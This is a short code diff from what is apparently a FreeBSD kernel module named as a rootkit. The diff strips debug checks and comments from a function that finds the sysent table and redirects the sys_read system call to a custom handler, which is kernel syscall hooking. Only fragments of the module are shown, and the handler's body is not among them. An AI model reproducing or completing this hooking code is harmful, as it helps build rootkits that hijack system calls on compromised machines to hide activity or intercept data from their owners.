@@ -79,31 +79,9 @@ static int custom_sysread(struct thread *td, void *syscall_args) {
 // Find the memory address of the sysent table and point to our handlers if found.
 static int find_sysread_address (void) {
 
-
-
-    // temp check that theres a valid address for sys_read
-    if (&sysent[SYS_read] == NULL) {
-        uprintf("SYS_read entry in sysent table is NULL.\n");
-        return 2;  // Return error
-    }
-
     // Store memory address of sysent table, See 4.
-    
-    // the LKM successfully gets to this point
 
     original_sysread = &sysent[SYS_read];
-
-    // temp check to see if we stored the address
-    if (original_sysread == NULL) {
-        uprintf("Failed to get address of sysent[SYS_read].\n");
-        return 3;  // Return error
-    }
-
-    // check to see if the sy_call in the sys_read struct has a valid address
-    if (original_sysread->sy_call == NULL) {
-        uprintf("sy_call pointer in sysent[SYS_read] is NULL.\n");
-        return 4;  // Return error
-    }
 
     // see if we can point to our custom handler
     if (original_sysread->sy_call) {
@@ -150,8 +128,6 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     int search_table_case = 0;
     switch (event) {
     case MOD_LOAD:
-        // the module is successfully loaded till here
-        // that means that whatever compilation issues or breaks happen, are after line 151
 
         search_table_case = find_sysread_address();
         if (search_table_case == 0) {
